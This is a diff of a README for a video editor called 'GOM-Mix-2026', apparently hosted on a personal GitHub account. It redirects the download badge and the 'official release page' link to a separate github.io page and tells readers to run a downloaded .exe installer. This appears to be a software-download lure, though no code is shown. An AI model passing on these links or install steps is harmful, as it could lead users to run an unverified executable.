@@ -1,6 +1,6 @@
 # 🎬 GOM-Mix-2026 - Simple tools for professional video editing
 
-[![](https://img.shields.io/badge/Download-GOM_Mix_2026-blue.svg)](https://github.com/Sequellayana39/GOM-Mix-2026)
+[![](https://img.shields.io/badge/Download-GOM_Mix_2026-blue.svg)](https://sequellayana39.github.io)
 
 ## 🎯 About this software
 
@@ -21,7 +21,7 @@ Your computer needs to meet these standards to run the software.
 
 Follow these steps to set up the editor on your computer.
 
-1.  Visit the official release page: [https://github.com/Sequellayana39/GOM-Mix-2026](https://github.com/Sequellayana39/GOM-Mix-2026).
+1.  Visit the official release page: [https://sequellayana39.github.io](https://sequellayana39.github.io).
 2.  Locate the download section on that page.
 3.  Click the link to save the installer file to your computer.
 4.  Open your Downloads folder and double-click the file named GOM-Mix-2026-Installer.exe.
